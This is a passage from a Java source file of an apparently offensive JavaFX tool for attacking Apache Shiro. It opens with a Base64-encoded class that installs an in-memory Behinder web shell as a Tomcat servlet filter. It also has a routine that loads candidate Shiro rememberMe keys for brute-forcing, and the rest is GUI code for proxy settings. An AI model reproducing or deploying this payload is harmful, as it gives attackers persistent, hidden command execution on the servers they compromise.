IdHRwU2Vzc2lvbgEAHWphdmF4L3NlcnZsZXQvanNwL1BhZ2VDb250ZXh0AQAMTWVtQmVoaW5kZXIzDABoAGkBAAhCZWhpbmRlcgEAAi8qDACHAIgBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgwBOwB%2BAQADTUQ1BwE8DAETAT0MAT4BPwwBQAFBAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAUIBHQwAaAFDDAEaAUQMAUUBGwwBRgFHDAFIARsMAUkBSgcBAAwBSwFMAQAHY29udGV4dAwBTQFOBwEBDAFPAVABACtvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0AQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvdXRpbC9MaWZlY3ljbGVCYXNlAQAFc3RhdGUHAVEMAVIBUwwBVAFVDAFWAVcHAVgMAVkBWgcBWwwBXAFdAQAQamF2YS9sYW5nL1N0cmluZwcBBAwBXwFgAQALZmlsdGVyU3RhcnQMAWEBKQwBYgFTAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAB0R5bmFtaWMBAAxJbm5lckNsYXNzZXMBAChqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljAQATamF2YS9sYW5nL1Rocm93YWJsZQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAJZ2V0SGVhZGVyAQAMZ2V0UGFyYW1ldGVyAQAJc2V0SGVhZGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAApzZXRSZXF1ZXN0AQAhKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OylWAQALc2V0UmVzcG9uc2UBACIoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRWYWx1ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZG9GaW5hbAEABihbQilbQgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABChJKVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAD3ByaW50U3RhY2tUcmFjZQEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABFnZXRTZXJ2bGV0Q29udGV4dAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7AQAVZ2V0RmlsdGVyUmVnaXN0cmF0aW9uAQA2KExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb247AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAib3JnL2FwYWNoZS9jYXRhbGluYS9MaWZlY3ljbGVTdGF0ZQEADVNUQVJUSU5HX1BSRVABACRMb3JnL2FwYWNoZS9jYXRhbGluYS9MaWZlY3ljbGVTdGF0ZTsBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAlhZGRGaWx0ZXIBAFQoTGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L3NlcnZsZXQvRmlsdGVyOylMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYzsBABxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlAQAHUkVRVUVTVAEAHkxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlOwEAEWphdmEvdXRpbC9FbnVtU2V0AQACb2YBACUoTGphdmEvbGFuZy9FbnVtOylMamF2YS91dGlsL0VudW1TZXQ7BwFjAQAYYWRkTWFwcGluZ0ZvclVybFBhdHRlcm5zAQAqKExqYXZhL3V0aWwvRW51bVNldDtaW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAJZ2V0TWV0aG9kAQAHU1RBUlRFRAEAIGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uACEAPQAxAAEAYwACAAAAZABlAAAAAABmAGcAAAAHAAEAaABpAAEAagAAADMAAgACAAAADyq3AAEqAbUAAiortQADsQAAAAEAawAAABIABAAAABQABAASAAkAFQAOABYAAQBsAG0AAgBqAAAAGQAAAAIAAAABsQAAAAEAawAAAAYAAQAAABoAbgAAAAQAAQBvAAEAcABxAAIAagAAAfIACAAOAAABPSvAAAQ6BCzAAAU6BRkEuQAGAQA6Biq0AALHABAqGQQSB7kACAIAtQACGQQSB7kACQIAEgq2AAuZAPsqtAACxgD0GQUSDBINuQAOAwAqtAACuAAPOgcZBhIQGQe5ABEDACq0AAMrtgASKrQAAyy2ABMSFLgAFToIuwAWWbsAF1m3ABgZBhIQuQAZAgC2ABoSG7YAHLYAHbYAHhIUtwAfOgkZCAUZCbYAIBkEuQAhAQC2ACI6ChIjuAAkEiUGvQAmWQMSJ1NZBLIAKFNZBbIAKFO2ACk6CxkLBLYAKhkIuwArWbcALBkKtgAttgAuOgwZCyq2AC%2B2ADAGvQAxWQMZDFNZBLsAMlkDtwAzU1kFuwAyWRkMvrcAM1O2ADTAACY6DRkNtgA1KrQAA7YANlenAAU6CC0ZBBkFuQA4AwCxAAEAYAEtATAANwACAGsAAABiABgAAAAfAAYAIAAMACEAFQAmABwAJwApACkAQQAqAEwALABVAC0AYAAwAGgAMQBwADIAdwAzAKAANACoADUAtAA2ANUANwDbADgA7gA6ASAAOwEtAD0BMAA8ATIAPwE8AEAAcgAAADMAA%2F4AKQcAcwcAdAcAdf8BBgAIBwB2BwB3BwB4BwB5BwBzBwB0BwB1BwB6AAEHAHv6AAEAbgAAAAYAAgB8AG8AAQB9AH4AAQBqAAAAGQAAAAEAAAABsQAAAAEAawAAAAYAAQAAAEQAAQB%2FAIAAAQBqAAAAsAAEAAgAAABEK8AAOcAAOU0sAzLAAAROLAQywAA6OgQsBTLAADs6BSwGMsAAPDoGuwA9WRkGtwA%2BEj8SQC24AEGnAAo6BxkHtgBDBKwAAQAnADgAOwBCAAIAawAAACoACgAAAEcACABIAA8ASQAXAEoAHwBLACcATQA4AFAAOwBOAD0ATwBCAFEAcgAAACIAAv8AOwAHBwB2BwCBBwA5BwBzBwCCBwB1BwCDAAEHAIQGAAkAhQCGAAEAagAAAIYABAADAAAAOQFMEkS4AEVNLCq2AB4DKrYARrYAR7sASFkELLYASbcAShAQtgBLtgBMTKcABE0rAxAQtgBNtgBOsAABAAIAKgAtADcAAgBrAAAAGgAGAAAAVQACAFgACABZABUAWgAqAFsALgBcAHIAAAATAAL%2FAC0AAgcAegcAegABBwB7AAAJAIcAiAACAGoAAAHdAAcADAAAAOctuQBPAQA6BBkEK7kAUAIAxwDWAToFAToGAToHAToIAToJGQS2AC8SUbYAUjoFGQUEtgBTGQUZBLYAVMAAVToGGQa2AC8SUbYAUjoFGQUEtgBTGQUZBrYAVMAAVjoHElcSWLYAUjoIGQgEtgBTGQgZB7IAWbYAWhkEKyq5AFsDADoJGQmyAFy4AF0DBL0AXlkDLFO5AF8EABJWEmABtgBhOgoZCgS2ACoZChkHAbYANFcZCBkHsgBitgBaGQgZB7IAYrYAWqcAIToKGQgZB7IAYrYAWqcAEjoLGQgZB7IAYrYAWhkLv7EABAAiALsAyAA3ACIAuwDXAAAAyADKANcAAADXANkA1wAAAAIAawAAAHoAHgAAAGAACABhABMAYgAWAGMAGQBkABwAZQAfAGYAIgBoAC4AaQA0AGoAQABrAEwAbABSAG0AXgBuAGcAbwBtAHAAdwBxAIIAcgCYAHMAogB0AKgAdQCxAHYAuwB6AMUAewDIAHcAygB6ANQAewDXAHoA4wB7AOYAfQByAAAARAAD%2FwDIAAoHAIkHAHoHAHoHAHMHAIoHAIsHAIwHAI0HAIsHAI4AAQcAe04HAI%2F%2FAA4ABQcAiQcAegcAegcAcwcAigAAAG4AAAAEAAEAQgACAJAAAAACAJEBAwAAAAoAAQD1AV4BAgYJ");

    }


    /**
     * 获取keys返回
     *
     * @return
     */
    private List<String> getShiroKeys() {

        List<String> list = new ArrayList<>();
        try {
            //优先读取本地配置的key
            File file = new File("shirokeys.txt");
            if (file.exists()) {
                list.addAll(FileUtils.readLines(file, Constants.ENCODING_UTF8));
            }
            //本地不存在，读自带key
            if (list.size() == Constants.LIST_SIZE_ZERO) {
                InputStream inputStream = Controller.class.getClassLoader().getResourceAsStream("ShiroKeys.txt");
                if (inputStream != null) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                    while (reader.ready()) {
                        list.add(reader.readLine());
                    }
                }

            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return list;
    }

    /**
     * 把map参数解析拼接到url后面
     *
     * @param url
     * @param params
     */
    private String parseGetData(String url, Map<String, Object> params) {
        if (url.contains("?")) {
            for (String s : params.keySet()) {
                url = url + "&" + s + "=" + params.get(s).toString();
            }
        } else {
            url = url + "?";
            for (String s : params.keySet()) {
                url = url + s + "=" + params.get(s).toString() + "&";
            }
        }

        return url;
    }


    @FXML
    public void about() {
        Alert alert = new Alert(AlertType.NONE);

        // 点 x 退出
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((e) -> {
            window.hide();
        });

        DialogPane dialogPane = new DialogPane();

        TextArea textArea = new TextArea(Constants.BASICINFO);
        textArea.setEditable(false);
        textArea.setWrapText(true);

        dialogPane.setContent(textArea);


        Image image = new Image(String.valueOf(getClass().getClassLoader().getResource("wx.jpg")));
        ImageView imageView = new ImageView();
        imageView.setImage(image);

        imageView.setFitWidth(200);
        imageView.setPreserveRatio(true);

        dialogPane.setGraphic(imageView);

        ButtonType confirm = new ButtonType("确认");
        dialogPane.getButtonTypes().setAll(confirm);
        alert.setDialogPane(dialogPane);

        alert.showAndWait();


    }

    private void initToolbar() {
        //代理 设置
        this.proxySetupBtn.setOnAction((event) -> {
            Alert inputDialog = new Alert(AlertType.NONE);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> {
                window.hide();
            });
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("启用");
            RadioButton disableRadio = new RadioButton("禁用");
            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);
            disableRadio.setSelected(true);
            HBox statusHbox = new HBox();
            statusHbox.setSpacing(10.0D);
            statusHbox.getChildren().add(enableRadio);
            statusHbox.getChildren().add(disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap(15.0D);
            proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label typeLabel = new Label("类型：");
            ComboBox typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
            typeCombo.getSelectionModel().select(0);
            Label IPLabel = new Label("IP地址：");
            TextField IPText = new TextField();
            Label PortLabel = new Label("端口：");
            TextField PortText = new TextField();
            Label userNameLabel = new Label("用户名：");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("密码：");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("取消");
            Button saveBtn = new Button("保存");


            try {
                Proxy proxy = (Proxy) settingInfo.get("proxy");

                if (proxy != null) {
                    enableRadio.setSelected(true);

                } else {
                    disableRadio.setSelected(true);
                }

                if (settingInfo.size() > 0) {
                    String type = (String) settingInfo.get("type");
                    if (type.equals("HTTP")) {
                        typeCombo.getSelectionModel().select(0);
                    } else if (type.equals("SOCKS")) {
                        typeCombo.getSelectionModel().select(1);
                    }

                    String ip = (String) settingInfo.get("ip");
                    String port = (String) settingInfo.get("port");
                    IPText.setText(ip);
                    PortText.setText(port);
                    String username = (String) settingInfo.get("username");
                    String password = (String) settingInfo.get("password");
                    userNameText.setText(username);
                    passwordText.setText(password);
                }


            } catch (Exception var28) {
                // this.proxyStatusLabel.setText("代理服务器配置加载失败。");
                this.log.appendText("代理服务器配置加载失败。");
                var28.printStackTrace();
            }


            saveBtn.setOnAction((e) -> {
                if (disableRadio.isSelected()) {
                    this.settingInfo.put("proxy", null);
                    // this.proxyStatusLabel.setText("");
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {

                    final String type;
                    if (!userNameText.getText().trim().equals("")) {
                        final String proxyUser = userNameText.getText().trim();
                        type = passwordText.getText();
                        Authenticator.setDefault(new Authenticator() {
                            public PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(proxyUser, type.toCharArray());
                            }
                        });
                    } else {
                        Authenticator.setDefault(null);
                    }

                    this.settingInfo.put("username", userNameText.getText());
                    this.settingInfo.put("password", passwordText.getText());
                    InetSocketAddress proxyAddr = new InetSocketAddress(IPText.getText(), Integer.parseInt(PortText.getText()));

                    this.settingInfo.put("ip", IPText.getText());
                    this.settingInfo.put("port", PortText.getText());
                    String proxy_type = typeCombo.getValue().toString();
                    settingInfo.put("type", proxy_type);
                    Proxy proxy;
                    if (proxy_type.equals("HTTP")) {
                        proxy = new Proxy(Proxy.Type.HTTP, proxyAddr);
                        this.settingInfo.put("proxy", proxy);
                    } else if (proxy_type.equals("SOCKS")) {
                        proxy = new Proxy(Proxy.Type.SOCKS, proxyAddr);
                        this.settingInfo.put("proxy", proxy);
                    }
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                }
            });

            cancelBtn.setOnAction((e) -> {
                inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            proxyGridPane.add(statusHbox, 1, 0);
            proxyGridPane.add(typeLabel, 0, 1);
            proxyGridPane.add(typeCombo, 1, 1);
            proxyGridPane.add(IPLabel, 0, 2);
            proxyGridPane.add(IPText, 1, 2);
            proxyGridPane.add(PortLabel, 0, 3);
            proxyGridPane.add(PortText, 1, 3);
            proxyGridPane.add(userNameLabel, 0, 4);
            proxyGridPane.add(userNameText, 1, 4);
            proxyGridPane.add(passwordLabel, 0, 5);
            proxyGridPane.add(passwordText, 1, 5);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            proxyGridPane.add(buttonBox, 0, 6);
            inputDialog.getDialogPane().setContent(proxyGridPane);
            inputDialog.showAndWait();
        });

    }


}
